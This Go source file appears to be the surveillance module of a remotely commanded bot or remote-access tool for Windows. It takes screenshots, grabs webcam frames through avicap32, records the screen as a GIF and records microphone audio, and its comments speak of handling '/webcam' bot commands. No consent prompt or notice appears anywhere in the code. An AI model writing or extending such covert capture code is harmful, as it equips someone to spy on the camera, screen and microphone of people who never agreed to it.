package media

import (
	"fmt"
	"image"
	"image/color/palette"
	"image/draw"
	"image/gif"
	"image/jpeg"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/image/bmp"
)

var (
	user32                      = syscall.NewLazyDLL("user32.dll")
	procSendMessageW            = user32.NewProc("SendMessageW")
	procSendMessageTimeoutW     = user32.NewProc("SendMessageTimeoutW")
	procDestroyWindow           = user32.NewProc("DestroyWindow")
	avicap32                    = syscall.NewLazyDLL("avicap32.dll")
	procCapCreateCaptureWindowW = avicap32.NewProc("capCreateCaptureWindowW")
	winmm                       = syscall.NewLazyDLL("winmm.dll")
	procMciSendStringW          = winmm.NewProc("mciSendStringW")
)

// Video for Windows (VFW) capture messages — see vfw.h / Windows SDK.
const (
	wmCapStart            = 0x0400
	wmCapUnicodeStart     = wmCapStart + 0x100 // 0x0500
	wmCapDriverConnect    = wmCapStart + 10    // 1034
	wmCapDriverDisconnect = wmCapStart + 11    // 1035
	wmCapGrabFrame        = wmCapStart + 60    // 1084
	wmCapAbort            = wmCapStart + 69    // 1093
	wmCapFileSaveDIBA     = wmCapStart + 25    // 1049
	wmCapFileSaveDIBW     = wmCapUnicodeStart + 25 // 1305
	smtoNormal            = 0x0000
	smtoAbortIfHung       = 0x0002
)

// sendCapMessage sends a VFW message with a timeout so a hung camera driver
// cannot block the bot/IPC handler indefinitely.
func sendCapMessage(hwnd uintptr, msg, wParam, lParam uintptr, timeoutMs uint32, flags uintptr) (uintptr, error) {
	var result uintptr
	ret, _, callErr := procSendMessageTimeoutW.Call(
		hwnd, msg, wParam, lParam,
		flags,
		uintptr(timeoutMs),
		uintptr(unsafe.Pointer(&result)),
	)
	if ret == 0 {
		if callErr != nil && callErr != syscall.Errno(0) {
			return 0, fmt.Errorf("capture message 0x%X timed out or failed: %w", msg, callErr)
		}
		return 0, fmt.Errorf("capture message 0x%X timed out or failed", msg)
	}
	return result, nil
}

// disconnectCapture releases the webcam driver. Using SMTO_ABORTIFHUNG here is
// unsafe: aborting mid-disconnect leaves the camera LED/device open and makes
// the next /webcam call stall for several seconds.
func disconnectCapture(hwnd uintptr) {
	_, _ = sendCapMessage(hwnd, wmCapAbort, 0, 0, 2000, smtoNormal)
	if _, err := sendCapMessage(hwnd, wmCapDriverDisconnect, 0, 0, 5000, smtoNormal); err == nil {
		return
	}
	// Last resort: blocking disconnect (may stall briefly on a wedged driver).
	_, _, _ = procSendMessageW.Call(hwnd, wmCapDriverDisconnect, 0, 0)
}

// CaptureScreen captures a screenshot of the primary display and saves it as PNG.
func CaptureScreen(outputPath string) error {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return err
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Save as JPEG with 85% quality for speed and compression
	return jpeg.Encode(file, img, &jpeg.Options{Quality: 85})
}

// CaptureWebcam snaps a JPEG image from the default webcam using avicap32.
func CaptureWebcam(outputPath string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	return captureWebcamInternal(outputPath)
}

func captureWebcamInternal(outputPath string) error {
	windowName, err := syscall.UTF16PtrFromString("WebcamCapture")
	if err != nil {
		return err
	}
	hwnd, _, _ := procCapCreateCaptureWindowW.Call(
		uintptr(unsafe.Pointer(windowName)),
		0,
		0, 0, 640, 480,
		0, 0,
	)
	if hwnd == 0 {
		return fmt.Errorf("failed to create capture window")
	}
	defer procDestroyWindow.Call(hwnd)

	ret, err := sendCapMessage(hwnd, wmCapDriverConnect, 0, 0, 8000, smtoAbortIfHung)
	if err != nil || ret == 0 {
		if err != nil {
			return fmt.Errorf("failed to connect to webcam driver: %w", err)
		}
		return fmt.Errorf("failed to connect to webcam driver (no camera connected or camera in use)")
	}
	defer disconnectCapture(hwnd)

	_, _ = sendCapMessage(hwnd, wmCapGrabFrame, 0, 0, 3000, smtoAbortIfHung)
	if _, err := sendCapMessage(hwnd, wmCapGrabFrame, 0, 0, 3000, smtoAbortIfHung); err != nil {
		return fmt.Errorf("failed to grab webcam frame: %w", err)
	}

	tmpBmpPath := outputPath + ".bmp"
	tmpBmpPathPtr, err := syscall.UTF16PtrFromString(tmpBmpPath)
	if err != nil {
		return err
	}

	ret, err = sendCapMessage(hwnd, wmCapFileSaveDIBW, 0, uintptr(unsafe.Pointer(tmpBmpPathPtr)), 8000, smtoAbortIfHung)
	if err != nil || ret == 0 {
		ansiPath, ansiErr := syscall.BytePtrFromString(tmpBmpPath)
		if ansiErr != nil {
			if err != nil {
				return fmt.Errorf("failed to capture frame: %w", err)
			}
			return fmt.Errorf("failed to capture frame (no camera connected or in use)")
		}
		ret, err = sendCapMessage(hwnd, wmCapFileSaveDIBA, 0, uintptr(unsafe.Pointer(ansiPath)), 8000, smtoAbortIfHung)
		if err != nil || ret == 0 {
			if err != nil {
				return fmt.Errorf("failed to capture frame: %w", err)
			}
			return fmt.Errorf("failed to capture frame (no camera connected or in use)")
		}
	}

	bmpFile, err := os.Open(tmpBmpPath)
	if err != nil {
		return fmt.Errorf("failed to open captured BMP: %v", err)
	}
	img, err := bmp.Decode(bmpFile)
	bmpFile.Close()
	os.Remove(tmpBmpPath)
	if err != nil {
		return fmt.Errorf("failed to decode BMP image: %v", err)
	}

	outFile, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	return jpeg.Encode(outFile, img, &jpeg.Options{Quality: 85})
}
// resizeImageNearest scales down an image using nearest-neighbor interpolation.
func resizeImageNearest(img image.Image, scale float64) *image.RGBA {
	bounds := img.Bounds()
	newW := int(float64(bounds.Dx()) * scale)
	newH := int(float64(bounds.Dy()) * scale)
	newImg := image.NewRGBA(image.Rect(0, 0, newW, newH))
	for y := 0; y < newH; y++ {
		for x := 0; x < newW; x++ {
			oldX := int(float64(x) / scale)
			oldY := int(float64(y) / scale)
			newImg.Set(x, y, img.At(oldX, oldY))
		}
	}
	return newImg
}

// RecordScreen captures screen frames and encodes them to an animated GIF at 5 FPS.
func RecordScreen(duration time.Duration, outputPath string) error {
	if duration <= 0 {
		duration = 5 * time.Second
	}
	if duration > 15*time.Second {
		duration = 15 * time.Second
	}
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)

	var frames []*image.Paletted
	var delays []int

	interval := 200 * time.Millisecond
	endTime := time.Now().Add(duration)
	maxFrames := 75

	for time.Now().Before(endTime) && len(frames) < maxFrames {
		start := time.Now()
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return err
		}

		resized := resizeImageNearest(img, 0.4)

		paletted := image.NewPaletted(resized.Bounds(), palette.Plan9)
		draw.Draw(paletted, paletted.Bounds(), resized, image.Point{}, draw.Src)

		frames = append(frames, paletted)
		delays = append(delays, 20)

		elapsed := time.Since(start)
		if elapsed < interval {
			time.Sleep(interval - elapsed)
		}
	}

	if len(frames) == 0 {
		return fmt.Errorf("no screen frames captured")
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	return gif.EncodeAll(file, &gif.GIF{
		Image:     frames,
		Delay:     delays,
		LoopCount: 0,
	})
}

// RecordAudio records microphone input and saves it to a WAV file using MCI commands.
func RecordAudio(duration time.Duration, outputPath string) error {
	if duration <= 0 {
		duration = 5 * time.Second
	}
	if duration > 60*time.Second {
		duration = 60 * time.Second
	}

	openPtr, _ := syscall.UTF16PtrFromString("open new type waveaudio alias recsound")
	ret, _, _ := procMciSendStringW.Call(uintptr(unsafe.Pointer(openPtr)), 0, 0, 0)
	if ret != 0 {
		return fmt.Errorf("failed to open audio recording device (no microphone found or access denied, MCI error %d)", ret)
	}
	defer func() {
		closePtr, _ := syscall.UTF16PtrFromString("close recsound")
		procMciSendStringW.Call(uintptr(unsafe.Pointer(closePtr)), 0, 0, 0)
	}()

	setPtr, _ := syscall.UTF16PtrFromString("set recsound bitspersample 16 bytespersec 176400 channels 2 samplespersec 44100 alignment 4")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(setPtr)), 0, 0, 0)

	recordPtr, _ := syscall.UTF16PtrFromString("record recsound")
	ret, _, _ = procMciSendStringW.Call(uintptr(unsafe.Pointer(recordPtr)), 0, 0, 0)
	if ret != 0 {
		return fmt.Errorf("failed to start audio recording (MCI error %d)", ret)
	}

	time.Sleep(duration)

	stopPtr, _ := syscall.UTF16PtrFromString("stop recsound")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(stopPtr)), 0, 0, 0)

	absPath, err := filepath.Abs(outputPath)
	if err != nil {
		absPath = outputPath
	}
	absPath = strings.ReplaceAll(absPath, "\\", "\\\\")

	saveCmd := fmt.Sprintf("save recsound \"%s\"", absPath)
	savePtr, _ := syscall.UTF16PtrFromString(saveCmd)
	ret, _, _ = procMciSendStringW.Call(uintptr(unsafe.Pointer(savePtr)), 0, 0, 0)
	if ret != 0 {
		return fmt.Errorf("failed to save WAV file via MCI (error code %d)", ret)
	}

	return nil
}
